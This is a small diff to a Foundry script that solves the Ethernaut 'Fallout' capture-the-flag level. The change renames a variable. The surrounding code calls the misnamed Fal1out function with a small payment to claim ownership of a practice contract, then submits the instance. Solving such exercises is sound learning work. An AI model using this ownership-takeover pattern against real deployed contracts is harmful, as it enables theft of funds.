@@ -18,12 +18,12 @@ contract Fallout is Ethernaut {
     vm.startBroadcast();
 
     // Create Instance
-    IFallout falloutContract = IFallout(createNewInstance(FALLOUT));
+    IFallout fallout = IFallout(createNewInstance(FALLOUT));
     // Task
-    falloutContract.Fal1out{value: 0.000001 ether}();
+    fallout.Fal1out{value: 0.000001 ether}();
 
     // Submission
-    submitInstance(FALLOUT, address(falloutContract));
+    submitInstance(FALLOUT, address(fallout));
 
     vm.stopBroadcast();
   }
